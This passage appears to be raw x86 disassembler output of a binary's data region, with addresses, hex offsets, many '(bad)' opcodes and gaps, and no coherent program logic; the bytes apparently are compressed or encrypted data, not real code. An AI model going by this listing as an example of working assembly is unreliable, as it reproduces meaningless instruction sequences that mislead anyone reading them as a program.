  426bcc:	rcl    DWORD PTR [esp+ebx*8+0x77],0x1b
  426bd1:	(bad)  
  426bd3:	inc    ebp
  426bd4:	jb     0x426c37
  426bd6:	gs jbe 0x426bdf
  426bd9:	clc    
  426bda:	jp     0x426c23
  426bdc:	(bad)  
  426bdd:	pop    ebp
  426bde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426bdf:	xor    eax,0x6dd77636
  426be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426be5:	push   ecx
  426be6:	(bad)  
  426be7:	sub    DWORD PTR [ebp+0x2dca447],edi
  426bed:	pop    ss
  426bee:	mov    WORD PTR [ebx+ebp*8],ds
  426bf1:	pop    esp
  426bf2:	mov    dl,0xc
  426bf4:	ins    DWORD PTR es:[edi],dx
  426bf5:	stos   DWORD PTR es:[edi],eax
  426bf6:	jmp    0xa1c3:0x31e57e0f
  426bfd:	shl    DWORD PTR [edx-0x34277739],1
  426c03:	jae    0x426c0d
  426c05:	enter  0xaf4b,0xf0
  426c09:	(bad)  
  426c0a:	(bad)  
  426c0b:	aad    0xf9
  426c0d:	sbb    al,BYTE PTR [eax]
  426c0f:	mov    ah,0x8b
  426c11:	test   ebx,ebx
  426c13:	push   es
  426c14:	sub    al,BYTE PTR [eax-0x447cb1e1]
  426c1a:	jnp    0x426bcd
  426c1c:	out    0x23,al
  426c1e:	retf   
  426c1f:	cmp    cl,ch
  426c21:	xchg   ecx,eax
  426c22:	loopne 0x426ca2
  426c24:	pusha  
  426c25:	xchg   esi,eax
  426c26:	mov    ah,0x5f
  426c28:	outs   dx,DWORD PTR ds:[esi]
  426c29:	out    0xa1,eax
  426c2b:	jge    0x426c75
  426c2d:	mov    al,ds:0xe67ee680
  426c32:	xchg   ebp,eax
  426c33:	cmp    al,0xcb
  426c35:	mov    ds:0xc2a2689f,al
  426c3a:	(bad)  
  426c3b:	xor    DWORD PTR [edx],esp
  426c3d:	clc    
  426c3e:	das    
  426c3f:	jp     0x426bc6
  426c41:	add    edx,eax
  426c43:	aaa    
  426c44:	jg     0x426c0e
  426c46:	out    dx,eax
  426c47:	int    0x2d
  426c49:	sbb    BYTE PTR [edx+0x519699d5],dh
  426c4f:	sbb    ebp,ebp
  426c51:	call   0x40f5:0x326e12fc
  426c58:	or     cl,BYTE PTR [esi]
  426c5a:	in     eax,dx
  426c5b:	jecxz  0x426c59
  426c5d:	xor    ch,BYTE PTR [ebx]
  426c5f:	ss gs ja 0x426c44
  426c63:	pop    ecx
  426c64:	aaa    
  426c65:	dec    eax
  426c66:	outs   dx,DWORD PTR ds:[esi]
  426c67:	inc    edi
  426c68:	fcmovb st,st(2)
  426c6a:	jno    0x426c9c
  426c6c:	mov    al,0xe7
	...
  426cd6:	loop   0x426d38
  426cd8:	test   DWORD PTR [esi+0x74f3f787],esi
  426cde:	mov    ah,0xeb
  426ce0:	cld    
  426ce1:	mov    edx,0xfbdd20f9
  426ce6:	addr16 mov al,ds:0x1
  426cea:	add    BYTE PTR [ecx],al
  426cec:	add    BYTE PTR [eax],al
  426cee:	out    0x36,eax
  426cf0:	(bad)  
  426cf2:	cmp    cl,dl
  426cf4:	cmc    
  426cf5:	(bad)  gs:[ebp-0x20938b6a]
  426cfc:	xchg   esp,eax
  426cfd:	sub    ah,BYTE PTR [esi]
  426cff:	test   BYTE PTR [ebp-0x3],cl
  426d02:	cs cdq 
  426d04:	test   DWORD PTR [eax-0xe91bd39],esi
  426d0a:	xchg   ebx,eax
  426d0b:	jne    0x426d1f
  426d0d:	fsub   DWORD PTR [edx+0x4e]
  426d10:	or     eax,0x5f4a24cd
  426d15:	aad    0xc3
  426d17:	test   DWORD PTR cs:[ebx],edi
  426d1a:	cmp    al,0x7a
  426d1c:	push   0xfffffffd
  426d1e:	xchg   ecx,eax
  426d1f:	xlat   BYTE PTR ds:[ebx]
  426d20:	xlat   BYTE PTR ds:[ebx]
  426d21:	mov    bh,BYTE PTR [esi]
  426d23:	in     al,dx
  426d24:	in     al,0x9b
  426d26:	bound  esi,QWORD PTR [edx+0x10]
  426d29:	cli    
  426d2a:	pop    edi
  426d2b:	(bad)  
  426d2c:	outs   dx,BYTE PTR ds:[esi]
  426d2d:	adc    al,0xd
  426d2f:	mov    edi,0x347fe93a
  426d34:	xor    eax,0x8a692ec8
  426d39:	dec    edi
  426d3a:	bound  eax,QWORD PTR [edx-0x3a91a1f7]
  426d40:	ds popf 
  426d42:	mov    edi,0xa0ae7415
  426d47:	mov    ah,0x54
  426d49:	mul    DWORD PTR [esi+0x69]
  426d4c:	ins    BYTE PTR es:[edi],dx
  426d4d:	cmp    al,dh
  426d4f:	or     ecx,DWORD PTR [edx+0x2c0b52ca]
  426d55:	sub    edi,ebp
  426d57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d58:	les    edx,FWORD PTR [esi+0x46]
  426d5b:	pop    ds
  426d5c:	int    0x6c
  426d5e:	dec    esi
  426d5f:	lea    edi,[ecx+0x53426568]
  426d65:	clc    
  426d66:	xor    bl,BYTE PTR [edi]
  426d68:	aaa    
  426d69:	idiv   bl
  426d6b:	jp     0x426cf9
  426d6d:	adc    eax,0x3cb0c776
  426d72:	stos   BYTE PTR es:[edi],al
  426d73:	pushf  
  426d74:	mov    ?,eax
  426d76:	jns    0x426d4e
  426d78:	sbb    eax,0xc2890a8f
  426d7d:	cmp    ah,BYTE PTR [eax*1+0x2940abca]
  426d84:	test   al,0x5d
  426d86:	lock (bad) 
  426d88:	enter  0x5e,0xdb
  426d8c:	in     eax,0x1c
  426d8e:	shl    dh,1
  426d90:	cmp    al,al
  426d92:	sub    al,BYTE PTR [ebp+esi*2-0x21]
  426d96:	int    0x6d
  426d98:	test   BYTE PTR [edi+0x49],0xe3
  426d9c:	mov    ebx,0x5f8d32aa
  426da1:	sbb    esi,DWORD PTR [ecx-0x9]
  426da4:	lds    ebx,FWORD PTR [eax]
  426da6:	mov    esp,0x6bfa2875
  426dab:	idiv   DWORD PTR [esi-0x1b]
  426dae:	fbld   TBYTE PTR [ebp-0x4c]
  426db1:	pop    ds
  426db2:	fsub   st,st(4)
  426db4:	out    dx,al
  426db5:	call   0xb502e5f2
  426dba:	adc    BYTE PTR [ebp-0x74],ah
  426dbd:	pop    edi
  426dbe:	sub    BYTE PTR [ecx-0x79],bl
  426dc1:	xchg   ebp,eax
  426dc2:	push   cs
  426dc3:	pop    ss
  426dc4:	or     DWORD PTR [ecx-0x6409f21b],ebp
  426dca:	mov    eax,0xe8b801c1
  426dcf:	jmp    0x60e40f52
  426dd4:	sbb    bh,0x69
  426dd7:	out    0xdb,eax
  426dd9:	fsubr  DWORD PTR [ebx+ebp*1]
  426ddc:	push   ebx
  426ddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426dde:	aaa    
  426ddf:	adc    al,0x56
  426de1:	shr    al,cl
  426de3:	mov    bh,BYTE PTR [ecx-0x74]
  426de6:	mov    eax,ds:0x35168cf5
  426deb:	sti    
  426dec:	jns    0x426e2b
	...
  426e56:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426e5c:	call   0xc90c:0xc7c2ecf9
  426e63:	(bad)  
  426e64:	idiv   BYTE PTR [edx]
  426e66:	addr16 mov eax,ds:0x1
  426e6a:	add    BYTE PTR [ecx],al
  426e6c:	add    BYTE PTR [eax],al
  426e6e:	push   edx
  426e6f:	push   cs
  426e70:	cmp    al,0xcb
  426e72:	ret    
  426e73:	out    dx,al
  426e74:	inc    ebx
  426e75:	or     BYTE PTR [esi-0x58030033],dl
  426e7b:	mov    fs,esp
  426e7d:	xor    al,0xaf
  426e7f:	and    ebx,DWORD PTR fs:0x38606160
  426e86:	repz clc 
  426e88:	jne    0x426e44
  426e8a:	(bad)  
  426e8b:	sbb    BYTE PTR [ecx-0x37f0fde0],ah
  426e91:	sahf   
  426e92:	adc    al,0x70
  426e94:	mov    ds:0x51b0753f,eax
  426e99:	push   ss
  426e9a:	xor    eax,0x7c317980
  426e9f:	cwde   
  426ea0:	mov    ebx,0x41f48812
  426ea5:	cmc    
  426ea6:	jne    0x426ed2
  426ea8:	sub    eax,0xd7b8b618
  426ead:	rol    BYTE PTR [eax+0x28005d35],1
  426eb3:	mov    ds:0x383716a6,eax
  426eb8:	push   edi
  426eb9:	or     eax,0x70c25c1d
  426ebe:	mov    esp,DWORD PTR [ecx-0xe621d26]
  426ec4:	mov    DWORD PTR [edx],esp
  426ec6:	lahf   
  426ec7:	loopne 0x426f3d
  426ec9:	cmp    cl,BYTE PTR [ebx]
  426ecb:	int    0x4f
  426ecd:	push   ebx
  426ece:	jge    0x426ec1
  426ed0:	dec    esi
  426ed1:	mov    esp,0x4a30d370
  426ed6:	shl    esi,0xc6
  426ed9:	xchg   edi,eax
  426eda:	pop    ebx
  426edb:	cmp    al,BYTE PTR [esi+0x3]
  426ede:	iret   
  426edf:	fsub   st,st(5)
  426ee1:	cmp    ch,bh
  426ee3:	outs   dx,DWORD PTR ds:[esi]
  426ee4:	out    0x1,eax
  426ee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ee7:	test   DWORD PTR [edx-0x44],ecx
  426eea:	fiadd  WORD PTR [esi]
  426eec:	fwait
  426eed:	add    eax,0xcb5a5680
  426ef2:	or     esp,edx
  426ef4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ef5:	cmp    al,0xfb
  426ef7:	or     BYTE PTR [ebp+0x66134e87],dl
  426efd:	pop    ds
  426efe:	sbb    DWORD PTR [ebx],esi
  426f00:	push   cs
  426f01:	push   eax
  426f02:	cld    
  426f03:	pop    ebx
  426f04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f05:	jno    0x426f6d
  426f07:	and    eax,0x29bdf84
  426f0c:	loopne 0x426eb2
  426f0e:	cmp    al,0xd6
  426f10:	std    
  426f11:	jae    0x426f80
  426f13:	inc    ebx
  426f14:	push   ss
  426f15:	xchg   ebp,eax
  426f16:	mov    ecx,0x41a61fe4
  426f1b:	aaa    
  426f1c:	mov    eax,0x83ff5ea4
  426f21:	xor    eax,0x6d5f0945
  426f26:	popa   
  426f27:	pop    es
  426f28:	loope  0x426eeb
  426f2a:	mov    dl,0x58
  426f2c:	sub    DWORD PTR [edi+eax*2+0x77],edi
  426f30:	xor    DWORD PTR ds:0x6dfdc922,ebp
  426f36:	add    al,ch
  426f38:	ja     0x426efe
  426f3a:	je     0x426f48
  426f3c:	stc    
  426f3d:	jb     0x426f1e
  426f3f:	scas   eax,DWORD PTR es:[edi]
  426f40:	pop    edx
  426f41:	sbb    edx,esp
  426f43:	jns    0x426edc
  426f45:	je     0x426f49
  426f47:	out    0x2e,al
  426f49:	pop    esp
  426f4a:	adc    ecx,edi
  426f4c:	sbb    dl,BYTE PTR [ebx]
  426f4e:	data16 loopne 0x426f8b
  426f51:	mov    eax,0xbb12920e
  426f56:	mov    dl,0xdc
  426f58:	xchg   ebx,edi
  426f5a:	or     BYTE PTR [ebx+0x77],bl
  426f5d:	push   ss
  426f5e:	sub    ebp,DWORD PTR [ecx-0x1d]
  426f61:	inc    eax
  426f62:	jmp    0x747390ed
  426f67:	jno    0x426fe6
  426f69:	inc    ebp
  426f6a:	aaa    
  426f6b:	xchg   BYTE PTR [edx],dh
  426f6d:	jmp    0x426f6f
	...
  426fd3:	add    BYTE PTR [eax],al
  426fd5:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426fdc:	mov    dh,0xf7
  426fde:	inc    edi
  426fdf:	inc    ecx
  426fe0:	add    DWORD PTR [esi+ebp*8+0x675d2e08],esp
  426fe7:	mov    ds:0x1000001,al
  426fec:	add    BYTE PTR [eax],al
  426fee:	cld    
  426fef:	and    al,0x93
  426ff1:	mov    edi,DWORD PTR fs:[ebx+esi*8-0x78]
  426ff6:	xor    DWORD PTR [edx-0x4],esp
  426ff9:	jg     0x42706b
  426ffb:	int    0x11
  426ffd:	push   edi
  426ffe:	jecxz  0x426f86
  427000:	mov    gs,WORD PTR [edi]
  427002:	dec    esi
  427003:	mov    ecx,0xe9fba59e
  427008:	ss push esi
  42700a:	out    0xaa,eax
  42700c:	xor    ch,BYTE PTR [eax+0x4c]
  42700f:	das    
  427010:	aam    0xe9
  427012:	cs sub eax,0x331e725c
  427018:	xchg   edi,eax
  427019:	cmp    edx,DWORD PTR [esp+esi*4+0x65]
  42701d:	mov    ah,0xd4
  42701f:	adc    DWORD PTR [edx-0x3e],eax
  427022:	arpl   WORD PTR [edi+0x4c0d2b45],sp
  427028:	push   ss
  427029:	jb     0x427024
  42702b:	loop   0x426fde
  42702d:	sbb    cl,ah
  42702f:	(bad)  
  427031:	inc    edx
  427032:	idiv   BYTE PTR [ebp-0x45]
  427035:	mov    edi,edi
  427037:	iret   
  427038:	mov    bh,0xb2
  42703a:	inc    ebp
  42703b:	inc    eax
  42703c:	mov    eax,0xf27b2fc4
  427041:	mov    dh,0x28
  427043:	mov    ds,WORD PTR [edi+0x3e0a9ee6]
  427049:	stc    
  42704a:	adc    BYTE PTR [edi],cl
  42704c:	pop    ds
  42704d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42704e:	hlt    
  42704f:	jo     0x4270b4
  427051:	add    BYTE PTR [ebx+0xeac2e05],bh
  427057:	outs   dx,DWORD PTR ds:[esi]
  427058:	daa    
  427059:	add    dh,ch
  42705b:	cmc    
  42705c:	dec    edx
  42705d:	stc    
  42705e:	dec    eax
  42705f:	out    dx,eax
  427060:	rol    BYTE PTR [esi],1
  427062:	dec    esp
  427063:	dec    esp
  427064:	push   esi
  427065:	cmp    ecx,eax
  427067:	cmp    al,0x1a
  427069:	mov    ecx,DWORD PTR [edi]
  42706b:	sbb    BYTE PTR [ecx-0x32],0xd8
  42706f:	cmp    BYTE PTR [eax],bh
  427071:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427072:	xchg   ecx,eax
  427073:	mov    dl,0x5c
  427075:	jb     0x4270aa
  427077:	in     al,dx
  427078:	cmp    bh,BYTE PTR [edi-0x81a8294]
  42707e:	fwait
  42707f:	aas    
  427080:	clc    
  427081:	add    DWORD PTR [edi-0x176e60c3],0x5fabbd3b
  42708b:	pushf  
  42708c:	ror    DWORD PTR [esi+0x5d],cl
  42708f:	mov    ah,0x49
  427091:	jge    0x4270c2
  427093:	out    dx,eax
  427094:	mov    ebp,0xd9ec5214
  427099:	add    al,0xfb
  42709b:	lock test DWORD PTR [eax+edx*1-0x2272b1dd],eax
  4270a3:	aaa    
  4270a4:	test   eax,0x81af5b1e
  4270a9:	fwait
  4270aa:	in     eax,0x23
  4270ac:	lds    ebp,FWORD PTR [esp+esi*8]
  4270af:	dec    edi
  4270b0:	push   eax
  4270b1:	pop    es
  4270b2:	in     al,0xc
  4270b4:	in     eax,dx
  4270b5:	add    ah,BYTE PTR [ecx-0xb71e547]
  4270bb:	dec    edx
  4270bc:	daa    
  4270bd:	mov    al,ds:0x73099564
  4270c2:	push   0xffffffa7
  4270c4:	jmp    0x954c:0x6f849778
  4270cb:	mov    edx,0xc233c456
  4270d0:	xchg   ebx,eax
  4270d1:	and    bl,dh
  4270d3:	jae    0x4270ba
  4270d5:	stc    
  4270d6:	and    al,0x8e
  4270d8:	pushf  
  4270d9:	int3   
  4270da:	xchg   esp,eax
  4270db:	(bad)  
  4270dd:	xor    ebp,esp
  4270df:	lods   eax,DWORD PTR ds:[esi]
  4270e0:	in     eax,dx
  4270e1:	fistp  DWORD PTR [edx+ebx*4+0x693f342]
  4270e8:	fadd   QWORD PTR [esi-0x11]
  4270eb:	sub    ebx,ebx
  4270ed:	push   0x0
	...
  427156:	or     al,0x6d
  427158:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42715e:	inc    esp
  42715f:	mov    ebp,0xe10a9d96
  427164:	addr16 jmp 0x100:0x1a367
  42716c:	add    BYTE PTR [eax],al
  42716e:	mov    BYTE PTR [edx-0x3f38872d],dl
  427174:	out    0x5c,eax
  427176:	push   edi
  427177:	(bad)  
  427178:	sbb    al,0xda
  42717a:	iret   
  42717b:	lods   al,BYTE PTR ds:[esi]
  42717c:	mov    bl,0xaa
  42717e:	sbb    edi,esi
  427180:	shr    DWORD PTR [edx-0x3513595e],0x5f
  427187:	mov    dl,0x95
  427189:	cmp    DWORD PTR [ebx-0x6f],edx
  42718c:	and    ebp,esi
  42718e:	test   al,0x12
  427190:	mov    edx,DWORD PTR ds:0x627ead35
  427196:	out    dx,eax
  427197:	xor    al,0xa7
  427199:	jbe    0x4271a6
  42719b:	xchg   ecx,eax
  42719c:	sti    
  42719d:	(bad)  
  42719e:	in     al,0x92
  4271a0:	mov    al,0x35
  4271a2:	(bad)  
  4271a3:	pop    ecx
  4271a4:	mov    cl,0x5
  4271a6:	repz or DWORD PTR [eax],0xffffff80
  4271aa:	or     cl,BYTE PTR ds:0x1fd029e7
  4271b0:	inc    ebx
  4271b1:	sub    esi,DWORD PTR [ebx-0x3ef37def]
  4271b7:	jb     0x4271d6
  4271b9:	repz and bh,BYTE PTR [edx+0x22]
  4271bd:	xchg   eax,esi
  4271bf:	out    dx,al
  4271c0:	inc    edi
  4271c1:	(bad)  
  4271c2:	xor    DWORD PTR [esi],0xd10a515
  4271c8:	jg     0x4271ac
  4271ca:	iret   
  4271cb:	add    eax,0xe869f1d4
  4271d0:	test   ah,bh
  4271d2:	sbb    DWORD PTR [eax+0x116de200],esi
  4271d8:	push   ecx
  4271d9:	or     eax,0x2e103345
  4271de:	aam    0x9f
  4271e0:	imul   eax,ebx,0x2b014fcc
  4271e6:	and    eax,0x408a0bb4
  4271eb:	push   cs
  4271ec:	xor    dl,BYTE PTR [ecx-0x6304aed]
  4271f2:	sbb    edx,DWORD PTR [ebx+0x57]
  4271f5:	lock rol DWORD PTR [esi-0x53d9a0ea],0x3d
  4271fd:	fcmovb st,st(2)
  4271ff:	dec    esi
  427200:	dec    esi
  427201:	popf   
  427202:	pop    ebp
  427203:	not    BYTE PTR [edi]
  427205:	pop    eax
  427206:	je     0x4271ff
  427208:	cli    
  427209:	in     al,0x7f
  42720b:	jge    0x427240
  42720d:	sbb    DWORD PTR [ebx],ecx
  42720f:	mov    eax,0x6efc1851
  427214:	jb     0x4271a6
  427216:	xor    DWORD PTR [eax-0x881fa13],ebp
  42721c:	aad    0x95
  42721e:	aas    
  42721f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427220:	addr16 call 0x43ab:0x5d1c3cc3
  427228:	(bad)  
  42722a:	mov    fs,WORD PTR [eax-0x13666d2b]
  427230:	add    esi,DWORD PTR [esi+0x478f9de7]
  427236:	xor    BYTE PTR [edx+0x60],dh
  427239:	mov    esi,DWORD PTR [esi+0x7a2446c1]
  42723f:	jb     0x427245
  427241:	pop    ss
  427242:	loopne 0x427294
  427244:	xchg   ebp,eax
  427245:	inc    ebx
  427246:	jbe    0x4272a7
  427248:	cmp    BYTE PTR [ebx-0x31ea172c],ah
  42724e:	pop    esi
  42724f:	out    0x98,al
  427251:	xchg   ebx,eax
  427252:	push   edx
  427253:	and    al,BYTE PTR [eax-0x6db64557]
  427259:	and    bl,BYTE PTR [esp+ecx*8+0x1f]
  42725d:	rol    BYTE PTR gs:[eax+0x64633aba],0xbd
  427265:	(bad)
  427269:	shl    DWORD PTR [edx+0x56f949],1
	...
  4272d3:	add    BYTE PTR [eax],al
  4272d5:	add    BYTE PTR [esi],bl
  4272d7:	inc    ecx
  4272d8:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  4272df:	push   ecx
  4272e0:	dec    ebp
  4272e1:	mov    ds:0xe15827d3,al
  4272e6:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4272e8:	add    DWORD PTR [eax],eax
  4272ea:	add    BYTE PTR [ecx],al
  4272ec:	add    BYTE PTR [eax],al
  4272ee:	loop   0x42730f
  4272f0:	mov    ebp,DWORD PTR [esi-0x414ccf89]
  4272f6:	stos   DWORD PTR es:[edi],eax
  4272f7:	out    0x33,al
  4272f9:	push   eax
  4272fa:	xchg   esp,eax
  4272fb:	out    dx,eax
  4272fc:	sub    bh,0xd6
  4272ff:	xchg   DWORD PTR ds:0xd3a8986d,ebx
  427305:	pop    edx
  427306:	leave  
  427307:	(bad)  
  427308:	lock inc ebp
  42730a:	mov    bh,0x8
  42730c:	jo     0x42738a
  42730e:	jmp    0xa4660eff
  427313:	mov    edx,eax
  427315:	adc    al,0x75
  427317:	in     eax,dx
  427318:	daa    
  427319:	lahf   
  42731a:	addr16 inc edi
  42731c:	loopne 0x42738d
  42731e:	mov    al,ds:0x39e2fa84
  427323:	pusha  
  427324:	fnsave [edi]
  427326:	push   edi
  427327:	mov    al,0xb4
  427329:	std    
  42732a:	out    0xe1,eax
  42732c:	xor    al,0xf3
  42732e:	sahf   
  42732f:	mov    al,ds:0x11f02751
  427334:	gs jecxz 0x427367
  427337:	mov    al,ds:0x5a01dd7b
  42733c:	das    
  42733d:	ds repz mov esp,?
  427341:	add    DWORD PTR [eax+0x45],eax
  427344:	shl    ah,1
  427346:	jp     0x4272cd
  427348:	sub    DWORD PTR [edi+0x35884a48],ebx
  42734e:	into   
  42734f:	in     eax,0x53
  427351:	enter  0xcea3,0xd0
  427355:	push   ds
  427356:	adc    BYTE PTR [edx-0x42],ah
  427359:	cmp    dh,BYTE PTR [eax]
  42735b:	imul   esi,DWORD PTR [esi],0x404ec1b5
  427361:	jo     0x4273ab
  427363:	jne    0x427394
  427365:	mov    esi,0xb3531f56
  42736a:	sub    edx,DWORD PTR [edx]
  42736c:	mov    esi,0xde238172
  427371:	push   ds
  427372:	mov    al,ds:0x710fdc4a
  427377:	out    dx,al
  427378:	lods   eax,DWORD PTR ds:[esi]
  427379:	mov    al,0x9a
  42737b:	jecxz  0x42736c
  42737d:	fdiv   QWORD PTR [ecx-0x51d48223]
  427383:	sub    edx,DWORD PTR ds:0xe1f12d15
  427389:	cdq    
  42738a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42738b:	stos   DWORD PTR es:[edi],eax
  42738c:	in     al,0xc3
  42738e:	das    
  42738f:	bound  edi,QWORD PTR [ecx]
  427391:	jp     0x4273e8
  427393:	scas   al,BYTE PTR es:[edi]
  427394:	stos   DWORD PTR es:[edi],eax
  427395:	lahf   
  427396:	xlat   BYTE PTR ds:[ebx]
  427397:	jge    0x427363
  427399:	mov    WORD PTR [edx],cs
  42739b:	push   0xfffffff1
  42739d:	mov    ebx,DWORD PTR [ebx]
  42739f:	test   eax,0x4843dc07
  4273a4:	outs   dx,DWORD PTR ds:[esi]
  4273a5:	cmp    ebp,DWORD PTR [ecx+0x13]
  4273a8:	je     0x427337
  4273aa:	xchg   esi,eax
  4273ab:	(bad)  
  4273ac:	btr    DWORD PTR [esi-0xcc1e6cb],edi
  4273b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4273b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4273b5:	and    al,0x24
  4273b7:	aam    0xed
  4273b9:	inc    ebp
  4273ba:	dec    eax
  4273bb:	pop    esi
  4273bc:	jle    0x4273b3
  4273be:	ret    
  4273bf:	pop    ebx
  4273c0:	retf   0x51e0
  4273c3:	sti    
  4273c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4273c5:	repnz mov WORD PTR [eax+ecx*8],gs
  4273c9:	cmp    DWORD PTR [esp+ebx*2-0x66],edi
  4273cd:	jbe    0x42735e
  4273cf:	stos   BYTE PTR es:[edi],al
  4273d0:	inc    edx
  4273d1:	or     DWORD PTR [eax+ebx*4],eax
  4273d4:	aaa    
  4273d5:	cld    
  4273d6:	les    eax,FWORD PTR [edi-0x48]
  4273d9:	lods   eax,DWORD PTR ds:[esi]
  4273da:	aad    0xf4
  4273dc:	in     al,0xb
  4273de:	ret    
  4273df:	popa   
  4273e0:	lds    ecx,FWORD PTR [ecx-0x7797df6e]
  4273e6:	or     eax,DWORD PTR [esi-0x2b182b08]
  4273ec:	test   eax,0x1a
	...
  427455:	add    BYTE PTR [edx],dl
  427457:	sbb    eax,0xaf3f8832
  42745c:	mov    edx,0x29f0389f
  427461:	sbb    esi,edx
  427463:	ja     0x4273ec
  427465:	into   
  427466:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  427468:	add    DWORD PTR [eax],eax
  42746a:	add    BYTE PTR [ecx],al
  42746c:	add    BYTE PTR [eax],al
  42746e:	loope  0x4273fe
  427470:	add    edi,DWORD PTR gs:[esi+0x16]
  427474:	push   edx
  427475:	push   0xc74f3a26
  42747a:	arpl   WORD PTR [ebx],dx
  42747c:	and    al,0x25
  42747e:	std    
  42747f:	or     BYTE PTR [esi-0x33],al
  427482:	jno    0x42745b
  427484:	rcl    DWORD PTR [ecx],0xba
  427487:	or     dl,ch
  427489:	cld    
  42748a:	(bad)  
  42748b:	repz scas al,BYTE PTR es:[edi]
  42748d:	mov    al,ds:0x379657b4
  427492:	pop    eax
  427493:	inc    ecx
  427494:	inc    ecx
  427495:	jmp    0x6b22:0xc203aa1f
  42749c:	push   esp
  42749d:	ds in  eax,0x40
  4274a0:	jp     0x42750d
  4274a2:	mov    ebp,0x3d69675a
  4274a7:	inc    ecx
  4274a8:	sahf   
  4274a9:	popa   
  4274aa:	push   ebp
  4274ab:	fs dec esi
  4274ad:	xchg   BYTE PTR [ebp-0x97d7b07],dh
  4274b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4274b4:	xchg   edx,eax
  4274b5:	fistp  QWORD PTR [edx-0x213cdc9]
  4274bb:	hlt    
  4274bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4274bd:	mov    ds:0x7a57566e,al
  4274c2:	cmp    eax,0x863cd93f
  4274c7:	jmp    0x4274b0
  4274c9:	enter  0xab5a,0x82
  4274cd:	cwde   
  4274ce:	fwait
  4274cf:	js     0x427500
  4274d1:	xor    DWORD PTR [edi],ebp
  4274d3:	push   ebp
  4274d4:	push   edi
  4274d5:	(bad)  [eax-0x1e]
  4274d8:	jo     0x427518
  4274da:	mov    esi,0x9da1d783
  4274df:	adc    dh,BYTE PTR [eax-0x51]
  4274e2:	nop
  4274e3:	ja     0x427514
  4274e5:	ret    
  4274e6:	out    dx,eax
  4274e7:	fld    DWORD PTR [eax]
  4274e9:	mov    eax,ds:0x8fc03e3
  4274ee:	fmul   QWORD PTR [ebx]
  4274f0:	add    ebx,DWORD PTR [edx+0xbb98a32]
  4274f6:	mul    BYTE PTR [esi]
  4274f8:	jnp    0x4274ce
  4274fa:	les    esi,FWORD PTR [ecx]
  4274fc:	out    dx,al
  4274fd:	mov    eax,ds:0xfb293dc8
  427502:	outs   dx,DWORD PTR ds:[esi]
  427503:	cmp    ebp,DWORD PTR [edi-0x5c8f16c2]
  427509:	sub    DWORD PTR [eax+0x6a],edx
  42750c:	mov    ds:0x4335c3a,eax
  427511:	ret    
  427512:	cmp    DWORD PTR [esi],esi
  427514:	addr16 jle 0x42749e
  427517:	iret   
  427518:	imul   edi,eax,0x6b3a7c36
  42751e:	stos   BYTE PTR es:[edi],al
  42751f:	fist   DWORD PTR [ebx+0x77]
  427522:	jne    0x4274d1
  427524:	pop    eax
  427525:	push   edx
  427526:	pop    edx
  427527:	stos   BYTE PTR es:[edi],al
  427528:	frstor [edx]
  42752a:	pop    edx
  42752b:	sub    al,0xab
  42752d:	stos   DWORD PTR es:[edi],eax
  42752e:	ins    DWORD PTR es:[edi],dx
  42752f:	stos   DWORD PTR es:[edi],eax
  427530:	mov    ah,0xdf
  427532:	ret    0x35c5
  427535:	cdq    
  427536:	out    0x2f,al
  427538:	js     0x42759d
  42753a:	xchg   DWORD PTR [eax-0x7109b99e],ebp
  427540:	or     DWORD PTR [ecx+0x37632d4f],esp
  427546:	pusha  
  427547:	cli    
  427548:	loope  0x427536
  42754a:	pop    esp
  42754b:	and    cl,cl
  42754d:	pushf  
  42754e:	pop    edi
  42754f:	adc    esi,ebx
  427551:	clc    
  427552:	adc    esp,DWORD PTR [esi+ebx*8-0x68e77b2e]
  427559:	test   BYTE PTR [ecx-0x426e1655],dl
  42755f:	sub    BYTE PTR [ebx-0x6f],0x9c
  427563:	retf   
  427564:	lahf   
  427565:	cmp    BYTE PTR [esi],ch
  427567:	inc    esi
  427568:	push   es
  427569:	add    BYTE PTR [esi],al
  42756b:	adc    BYTE PTR [edx-0x52],bl
	...
  4275d6:	pop    esp
  4275d7:	test   al,0xc0
  4275d9:	stos   DWORD PTR es:[edi],eax
  4275da:	hlt    
  4275db:	jmp    0x42765c
  4275dd:	(bad)  
  4275de:	cmp    dh,BYTE PTR [esi]
  4275e0:	jbe    0x42764c
  4275e2:	pcmpgtd mm7,QWORD PTR [esp+ebx*8]
  4275e6:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4275e8:	add    DWORD PTR [eax],eax
  4275ea:	add    BYTE PTR [ecx],al
  4275ec:	add    BYTE PTR [eax],al
  4275ee:	shl    DWORD PTR [edi],0xc9
  4275f1:	enter  0xd596,0x2a
  4275f5:	cwde   
  4275f6:	pop    esp
  4275f7:	fs cmp esi,ecx
  4275fa:	and    eax,0x24c3b0c8
  4275ff:	mov    ebx,0x487c2361
  427604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427605:	repz push 0x5075d111
  42760b:	stos   BYTE PTR es:[edi],al
  42760c:	push   ecx
  42760d:	push   ss
  42760e:	rcl    DWORD PTR [edi-0x6147bad6],1
  427614:	sbb    al,dh
  427616:	sbb    DWORD PTR [ebx-0x30f02861],0xf80d5477
  427620:	add    BYTE PTR [edx+0x27],dl
  427623:	push   ds
  427624:	mov    dh,0xb7
  427626:	pop    edi
